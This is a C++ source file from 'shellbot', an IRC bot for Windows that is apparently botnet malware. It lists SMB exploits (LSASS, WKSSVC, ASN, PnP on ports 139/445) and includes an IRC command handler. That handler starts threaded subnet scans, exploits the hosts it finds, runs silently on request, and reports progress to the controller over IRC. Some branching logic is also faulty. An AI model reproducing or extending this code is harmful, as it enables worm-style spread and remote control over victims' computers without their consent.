	/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "vInclude.h"
#include "vPOEb.h"
#include "vExterns.h"

/*ExplInfo exploit[]={
//	 EXPLOIT		EXPLOIT NAME	PORT	METHOD		STATS
	{"asn139",		"asn139",		139,	ASN,		0},
	{"asn445",		"asn445",		445,	ASN,		0},
	{"pnp445",		"pnp445",		445,	PnP445,		0},
	{"wksvce",		"WKSSVCE",		445,	wkssvce,	0},
	{"wksvco",		"WKSSVCO",		445,	wkssvco,	0},
	{"wksvc2",		"WKSSVC2",		445,	wkssvc2,	0},
	{"wksvce139",	"WKSSVCE139",	139,	wkssvce,	0},
	{"wksvco139",	"WKSSVCO139",	139,	wkssvco,	0},
	{"wksvc2139",	"WKSSVC2139",	139,	wkssvc2,	0},
	{NULL,			NULL,			0,		NULL,		0}
};*/

/*	{{"asn139",	"ASN HTTP 139",		139,	asn_http,		0},
	{"asn445",	"ASN HTTP 445",		445,	asn_http,		0},
	{"pnp445",	"PNP HTTP 445",		445,	pnp_http,		0},
	{"wkshttp",	"WKS HTTP 139",		139,	wkssvc_http,	0},*/

ExplInfo exploit[] = 
	{{"wkse",	"WKS FTP 139",	 139,	wkse_ftp,	0},
	{"wkso",	"WKS FTP 139",	 139,	wkso_ftp,	0},
	{"asn139",	"ASN FTP 139",	 139,	asn_ftp,	0},
	{"asn445",	"ASN FTP 445",	 445,	asn_ftp,	0},
	{"pnp445",	"PNP FTP 445",	 445,	pnp_ftp,	0},
	{"lsass445","LSASS FTP 445", 445,	lsass_ftp,	0},
	{NULL,		NULL,			 0,		NULL,		0}};

/*  // SCANNER SYNTAX //
 *
 * scan <exploit> <threads> <delay> [-o|x.x.x.x|1.2.3.4|-s]
 * o -> scan own subnet
 * s -> silent
 *
 */

void CPCAPCmd::ExecuteCmd(vector <string> iBuffer, int p, string cmd)
{
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_blue,"Parsing command (%s).",cmd.c_str());
#endif // DEBUGMODE
	if (cmd == scan_sta[0] || cmd == scan_sta[1] && iBuffer.size() - p > 4) {
//		if (!vPOEb->vPOEscan.main.bRunning) {
			if(!vPOEb->vPOEshell.main.bRunning) {
				vPOEb->vPOEshell.Start(true);
			} else {
				bool bSilent = false;
				//! Check to see if -s option is provided
				if (iBuffer.size() - p > 5) {
					if (iBuffer[p+5] == "-s")
						bSilent = true;	}
				//! Scan its own external ip subnet
				if (iBuffer[p+4] == "-o") {
					struct in_addr iAddr; 
					iAddr.s_addr = vPOEb->vIRC.ResolveAddress(vPOEb->vPOEscan.sExternalHost);
					string p = inet_ntoa(iAddr);
					vPOEb->vPOEscan.main.scanRange = 
						vPOEb->vPOEscan.ExtractRange(p); 
				} else if (iBuffer[p+4] != "-o") {
					struct in_addr iAddr; 
					iAddr.s_addr = vPOEb->vIRC.ResolveAddress(vPOEb->vPOEscan.sLocalHost);
					string p = inet_ntoa(iAddr);
					vPOEb->vPOEscan.main.scanRange = 
						vPOEb->vPOEscan.ExtractRange(p); 
				} else vPOEb->vPOEscan.main.scanRange = iBuffer[p+4];
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_gray,"Extracted range: %s", vPOEb->vPOEscan.main.scanRange.c_str());
#endif // DEBUGMODE
				vPOEb->vPOEscan.main.scanExploit = iBuffer[p+1];
				for(int i=0;exploit[i].port != 0;i++)
				{
//					if (vPOEb->vPOEscan.main.scanExploit.compare(exploit[i].command))
					if (vPOEb->vPOEscan.main.scanExploit == exploit[i].command)
					{
						vPOEb->vPOEscan.main.scanExploit = exploit[i].name;
						vPOEb->vPOEscan.main.tInfo.port = exploit[i].port;
						vPOEb->vPOEscan.main.scanIndex = i;

						break;
					}
				}
				vPOEb->vPOEscan.main.scanDelay = lexical_cast<int>(iBuffer[p+3]);
				vPOEb->vPOEscan.main.scanThreads = lexical_cast<int>(iBuffer[p+2]);
				vPOEb->vPOEscan.main.bRunning = true;
				vPOEb->vPOEscan.Start(true);
				if (!bSilent) {
					vPOEb->vIRC.SendData("PRIVMSG %s :Starting TCP scan @ %s and "
						"exploiting via %s with a delay of %ss using %s threads...\r\n", 
						vPOEb->vIRC.msgTo.c_str(), vPOEb->vPOEscan.main.scanRange.c_str(), 
						vPOEb->vPOEscan.main.scanExploit.c_str(), iBuffer[p+3].c_str(), 
						iBuffer[p+2].c_str());		
				}
			}
//		}
	}
	else if (cmd == scan_cip[0] || cmd == scan_cip[1]){
	}
	else if (cmd == scan_sto[0] || cmd == scan_sto[1]) {
		if (vPOEb->vPOEscan.main.bRunning) {
			bool bSilent = false;
			//! Check to see if -s option is provided
			if (iBuffer.size() - p > 1) {
				if (iBuffer[p+1] == "-s")
					bSilent = true;	}
				vPOEb->vPOEscan.main.bRunning = false;
				vPOEb->vPOEscan.main.Stop();
			if (!bSilent) {
				vPOEb->vIRC.SendData("PRIVMSG %s :Stopped scanning.\r\n",
					vPOEb->vIRC.msgTo.c_str());
			}
		}
	}
}
